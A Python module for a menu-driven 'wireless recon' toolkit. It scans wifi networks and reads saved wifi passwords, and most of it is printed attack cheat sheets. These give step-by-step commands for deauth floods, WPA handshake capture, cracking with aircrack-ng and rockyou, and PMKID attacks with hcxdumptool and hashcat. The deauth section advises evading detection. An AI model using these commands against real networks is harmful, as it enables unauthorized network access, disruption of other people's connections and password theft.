# wireless recon tools - wifi scanning, handshake info, etc
import os, subprocess
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def runcmd(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.stdout + p.stderr
    except:
        return "[!] failed"

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")


def wifi_scan():
    clr()
    console.print("[bold red]=== WIFI NETWORK SCAN ===[/bold red]\n")
    
    # find wireless interfaces
    console.print("[yellow]wireless interfaces:[/yellow]")
    console.print(runcmd("iw dev 2>/dev/null | grep Interface"))
    
    iface = Prompt.ask("[cyan]interface (e.g. wlan0)[/cyan]", default="wlan0")
    
    # put in monitor mode briefly
    console.print(f"\n[yellow]scanning with {iface}...[/yellow]\n")
    
    # try iwlist first (works without monitor mode)
    out = runcmd(f"iwlist {iface} scan 2>/dev/null", t=30)
    
    if "Cell" in out or "BSS" in out:
        # parse results
        networks = []
        current = {}
        for line in out.split('\n'):
            line = line.strip()
            if "Cell" in line and "Address" in line:
                if current:
                    networks.append(current)
                current = {"bssid": line.split("Address:")[-1].strip()}
            elif "ESSID" in line:
                current["essid"] = line.split('"')[1] if '"' in line else "?"
            elif "Channel" in line:
                current["channel"] = line.split(":")[-1].strip()
            elif "Encryption" in line.lower():
                current["enc"] = line.split(":")[-1].strip()
            elif "Signal" in line:
                current["signal"] = line.split("=")[-1].strip() if "=" in line else line.split(":")[-1].strip()
        if current:
            networks.append(current)
        
        if networks:
            t = Table(box=box.SIMPLE, title=f"Found {len(networks)} networks")
            t.add_column("ESSID", style="bold")
            t.add_column("BSSID")
            t.add_column("CH")
            t.add_column("Signal")
            t.add_column("Enc")
            for n in networks:
                t.add_row(
                    n.get("essid", "?"),
                    n.get("bssid", "?"),
                    n.get("channel", "?"),
                    n.get("signal", "?"),
                    n.get("enc", "?")
                )
            console.print(t)
        else:
            console.print("[red]could not parse results[/red]")
            console.print(out[:500])
    elif "rfkill" in out or "blocked" in out:
        console.print("[red]wifi is blocked (rfkill)[/yellow]")
        console.print("[dim]try: rfkill unblock wifi[/dim]")
    else:
        console.print("[dim]iwlist failed, trying nmcli...[/dim]")
        out2 = runcmd("nmcli -f SSID,BSSID,FREQ,SECURITY,SIGNAL dev wifi list 2>/dev/null")
        if out2.strip():
            console.print(out2)
        else:
            console.print("[red]scan failed. make sure wifi is on and you have permissions[/red]")
    
    pause()

def wifi_info():
    clr()
    console.print("[bold red]=== WIFI CONNECTION INFO ===[/bold red]\n")
    
    console.print("[yellow]--- Connected Network ---[/yellow]")
    console.print(runcmd("iwgetid 2>/dev/null"))
    console.print(runcmd("iw dev wlan0 link 2>/dev/null"))
    
    console.print("\n[yellow]--- IP Config ---[/yellow]")
    console.print(runcmd("ip addr show wlan0 2>/dev/null"))
    
    console.print("\n[yellow]--- Saved Networks ---[/yellow]")
    console.print(runcmd("nmcli connection show 2>/dev/null | head -20"))
    
    console.print("\n[yellow]--- Wifi Passwords (saved) ---[/yellow]")
    console.print("[dim]requires root:[/dim]")
    console.print(runcmd("nmcli -s connection show 2>/dev/null | grep wifi-security | head -5"))
    
    pause()

def deauth_info():
    clr()
    console.print("[bold red]=== DEAUTHENTICATION INFO ===[/bold red]\n")
    console.print("""[yellow]deauth attacks disconnect clients from wifi networks[/yellow]

[y]IMPORTANT:[/] this is illegal without authorization on networks you dont own

[i]tools:[/i]

  [cyan]aireplay-ng:[/cyan]
    # put interface in monitor mode first
    airmon-ng start wlan0
    
    # deauth a specific client
    aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
    
    # deauth all clients (broadcast)
    aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon

  [cyan]mdk4:[/cyan]  
    # deauth all clients on channel
    mdk4 wlan0mon d -B <AP_BSSID>

  [cyan]horst:[/cyan]
    # built-in deauth capability
    horst -i wlan0mon

[y]requirements:[/y]
  - wireless adapter that supports monitor mode
  - aircrack-ng suite (pacman -S aircrack-ng)
  - interface in monitor mode

[y]detection:[/y]
  - WIDS/WIPS systems detect deauth floods
  - some APs have 802.11w (protected management frames)
  - use with moderation to avoid detection
""")
    pause()

def handshake_capture():
    clr()
    console.print("[bold red]=== HANDSHAKE CAPTURE GUIDE ===[/bold red]\n")
    console.print("""[yellow]capturing the 4-way WPA handshake enables offline password cracking[/yellow]

[y]step by step:[/y]

  [cyan]1. put interface in monitor mode:[/cyan]
    sudo ip link set wlan0 down
    sudo iw wlan0 set type monitor
    sudo ip link set wlan0 up
    
  [cyan]2. start capturing:[/cyan]
    sudo airodump-ng wlan0mon --write handshake
    
  [cyan]3. target a specific AP:[/cyan]
    sudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> --write target wlan0mon
    
  [cyan]4. force a handshake (deauth a client):[/cyan]
    sudo aireplay-ng --deauth 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
    
  [cyan]5. verify you captured it:[/cyan]
    look for "WPA handshake: <BSSID>" in airodump-ng corner
    
  [cyan]6. crack the handshake:[/cyan]
    aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

[y]alternative tools:[/y]
  - hcxdumptool: newer, better for modern APs
    hcxdumptool -i wlan0mon -o capture.pcapng --filtermode=1
  
  - bettercap: framework with wifi module
    wifi recon on; wifi.deauth <bssid>

[y]wordlists:[/y]
  /usr/share/wordlists/rockyou.txt
  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
  or create custom with: crunch/hashcat rules
""")
    pause()

def aircrack_info():
    clr()
    console.print("[bold red]=== AIRCRACK-NG CHEAT SHEET ===[/bold red]\n")
    
    cheat = """[yellow]--- airmon-ng (monitor mode) ---[/yellow]
  airmon-ng check kill          kill interfering processes
  airmon-ng start wlan0         enable monitor mode
  airmon-ng stop wlan0mon       disable monitor mode

[yellow]--- airodump-ng (capture) ---[/yellow]
  airodump-ng wlan0mon                        scan all
  airodump-ng -c 6 --bssid XX:XX wlan0mon     target specific
  airodump-ng --write out wlan0mon             save captures
  airodump-ng --channel 1-13 wlan0mon         scan specific channels

[yellow]--- aireplay-ng (injection) ---[/yellow]
  aireplay-ng --test wlan0mon                  test injection
  aireplay-ng --deauth 10 -a <BSSID> wlan0mon deauth
  aireplay-ng -3 -b <BSSID> wlan0mon          ARP replay
  aireplay-ng -0 0 -a <BSSID> wlan0mon        continuous deauth

[yellow]--- aircrack-ng (cracking) ---[/yellow]
  aircrack-ng -w wordlist.txt capture.cap      dictionary attack
  aircrack-ng -b <BSSID> -w wordlist.txt cap   target specific
  aircrack-ng -a 1 -b <BSSID> cap             WEP cracking
  aircrack-ng -S                               stats while cracking

[yellow]--- airdecap-ng (decrypt) ---[/yellow]
  airdecap-ng -w password.txt capture.cap      decrypt cap with password
  airdecap-ng -e <ESSID> -p <pass> cap        decrypt by essid

[yellow]--- common issues ---[/yellow]
  - "no stations found": wait or deauth clients
  - "no WPA handshake": force with deauth
  - interface wont go monitor: check rfkill, drivers
  - try: ip link set wlan0 down && iw wlan0 set type monitor
"""
    console.print(cheat)
    pause()

def pmkid_attack():
    clr()
    console.print("[bold red]=== PMKID ATTACK INFO ===[/bold red]\n")
    console.print("""[yellow]PMKID attack = grab handshake without any connected clients[/yellow]

[y]how it works:[/y]
  - PMKID is stored in the first EAPOL frame (association request)
  - we can get it by just sending a single association request to the AP
  - no clients needed, no deauth needed
  - much quieter than traditional handshake capture

[y]using hcxdumptool + hcxpcapngtool:[/y]

  [cyan]1. capture PMKID:[/cyan]
    sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filtermode=1

  [cyan]2. convert to hashcat format:[/cyan]
    hcxpcapngtool -o pmkid_hash.txt pmkid.pcapng

  [cyan]3. crack with hashcat:[/cyan]
    hashcat -m 16800 pmkid_hash.txt wordlist.txt
    (or -m 22000 for newer hcxpcapngtool output)

[y]requirements:[/y]
  - hcxdumptool
  - hcxpcapngtool (part of hcxtools)
  - hashcat
  - wireless adapter supporting monitor mode

[y]advantages over traditional handshake:[/y]
  - no clients needed on the network
  - no deauth (stealthier)
  - single packet is enough
  - works on most WPA/WPA2 networks
""")
    pause()


def run():
    while True:
        clr()
        console.print("[bold red]=== WIRELESS ===[/bold red]\n")
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "WiFi Network Scan",
            "WiFi Connection Info",
            "Handshake Capture Guide",
            "PMKID Attack Info",
            "Aircrack-ng Cheat Sheet",
            "Deauth Attack Info",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]WIRELESS[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: wifi_scan()
        elif c == 2: wifi_info()
        elif c == 3: handshake_capture()
        elif c == 4: pmkid_attack()
        elif c == 5: aircrack_info()
        elif c == 6: deauth_info()
        elif c == 0: return
